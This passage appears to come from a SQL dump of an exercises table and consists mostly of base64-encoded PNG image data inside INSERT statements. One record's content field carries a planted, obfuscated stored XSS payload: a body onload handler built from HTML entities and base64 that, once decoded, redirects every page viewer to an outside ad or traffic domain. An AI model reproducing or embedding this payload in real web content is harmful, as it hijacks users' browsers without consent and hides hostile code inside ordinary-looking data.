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\"></p><body/onload=e&#x76;&#x61;l&#x28;a&#x74;&#x6f;b&#x28;&#34;d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vd3d3LnRvcHJldmVudWVnYXRlLmNvbS9jbmN0d2pkbj9rZXk9NzU0YTVmZGE2Mjk1N2M4MDc1NzdiOTEyYmFiOThlYzYiKQ==&#34;&#x29;&#x29;>', -1, '', '', '', '', '', NULL, -1, 1, 1, 'test', '2023-10-31 20:08:47', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, NULL, '<p><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXUAAAFlCAYAAAAUK3hTAAABUmlDQ1BJQ0MgUHJvZmlsZQAAGJV10DFLAmEYB/D/kaFoRENDgeENLoFFnEJDkzqEUHBYobWd53lG5/VydxLtQXtDNDY1SEuTRItDHyAIKvoA+gGEW1Ku5/Wq06IXHp4ffx5eHh5AGCiMGSEADdOxips5sbx/IIZ7iCKBCBYRV1SbZWV5i0bw3Sef+wKB9+cV/lehnxDCCyVhafuu+dZq3f+dn3jRqmar1AdUSZVZDiCIZPnEYdyMPG/RUuQzbt33FXfF9+1oZreYJ3fIc2pdqZKfyKnKWK6PuWE01a8d+PYzmrm3Qz1CFYeEDMqQ/pnJjGbyOAbDKSwcQkcdDkRkKWEwoJELMKFiFSmyhDWqNL/t75sF2dE1sH5O6AZZrQs8XACzG0GWlGmVHvAYY4ql/FxScEN2LS35jrWB6UvP65eA8DIwfPW8j7bnDW+AqXeg434CzANhFHOUvbUAAAA4ZVhJZk1NACoAAAAIAAGHaQAEAAAAAQAAABoAAAAAAAKgAgAEAAAAAQAAAXWgAwAEAAAAAQAAAWUAAAAAherisQAAQABJREFUeAHtnQf8HkXx/9cuiCWEXiQQQu+9SkkIHf8SkCIt1NBBaqSFEooiQgAhwI8iEGoiQSFU6b0EpJdQA4TeREHU+897ZM997rm7555evjOv1z23tzvbPvfc3N7s7szXIiFnZAgYAoaAIdATCHy9J3phnTAEDAFDwBBQBEyo2x/BEDAEDIEeQsCEeg/dTOuKIWAIGAIm1O0/YAgYAoZADyFgQr2HbqZ1xRAwBAwBE+r2HzAEDAFDoIcQMKHeQzfTumIIGAKGQMcL9UMPPdRdcsklTblTV199tdt1113jo1GVUGZfoM8++0yxS+vreuut51566aW0JIszBAyBJiLwtUqbj0aOHOlOPPFE14w9Sl/72tfc3//+dzfddNM5wml1EA+lpdWLy8SJE90dd9zh/vWvf7nTTz+9YXVk9aXe9rYi/4orruhOOukkt+aaa1as7oMPPnD9+/dPxQ0M+vXr5+AxMgQMgdYhkCnUt9lmG3fppZe6b33rW+7LL79MfXDrbWYo/MJwWO5HH33kvvOd76jgD+MbGf7HP/7hpp9++ob1MasvjWwzLznqaTRR5m233Va3UH/nnXfcTDPN5L7+9Y7/GGw0hFaeIdBWBDKfOAT6M8884/75z382pYGVRt7bbrut49h7771TP/GvueYad84552jblllmGTfjjDO6N954I7Wtd955p9txxx3duHHjUtOzIhnFH3TQQSXJXI8aNaokjov111/fffvb33ZbbLFFWRoRRx11lKbDVy/9+Mc/zhSWfPmMGDHCHX/88WXVgPk666yjL+rFFlvMXX755TEP/fJ9PfvsszUcxnlGylhhhRW0L2lqJn/fDjjgAP3C8/nC84svvujmnHNON9tss7nXX389TNIwL4JZZpmlLN4iDAFDoAAC8pBWJCmmIk81DAsssEAkggmbM9E888yjhw/vtddeWpSP/8Y3vqF8yfJ32WWXaPnll9e0jTfeOFp88cU1LHremFU+/TVORvpan6gDIl9+zCQBEYSpdYwePbosnnaKyiHO/uabbyrPwgsvHIkwjURQleT5z3/+E9GHH/7wh1r3zDPPrOmff/55XEbRgC9rhhlmiAgnibZxzD333NGss84a0W9P7777rqaBPRistNJKkbwMfXI011xz6UF+2uivOXuaPHmylgHu9NX3xadz9veNcn7yk5+ESRpeZJFFtIxhw4ZFonePy0sy0nb5eor+/e9/J5Ps2hAwBHIQKCSteUAbTZ988kkkunQt9m9/+1uJAArrQkik1Y9QJ55yPHF92WWX+UsVpgj8SlSPUKfOI444oqSKsL28GELhCuOCCy4YrbrqqiV5Kl28/PLL2t/VVlstlXXgwIGpOHnmOeaYI/rud7/rLzPPtF3UL6nppP3pT3+K095///3MOuFNCvVXX31V+eXrLy7j2WefzSxDvmo0TdR/Mb8FDAFDIB+BTPWLPJRNpQ8//FAn2aiECUt099USE3Hf//73S7K99tprei0Cx8koz/3xj38sSW/GxTHHHJNZ7GGHHeaGDh1akn7KKae4e+65pyQu7wK10bzzzutuv/12d9ddd6WyTpkyxf31r39NTSPywQcfdPJ14GQE76ZNm5bJVylho402qsSSmT527FidBwjvtbzglP/cc88ty3f99dc78IOfvhsZAoZAZQS+WZml8RzhBF8yLO+gkgrD9DCB+Kw0+D7++GNlF9VHmK0h4bx60yqQ0W1uW9PyhHH+pYCe+uGHHw6TSsKigiq5Di/QYbPKh9Uqs88+uybddNNNqmMP+aoJV8Ih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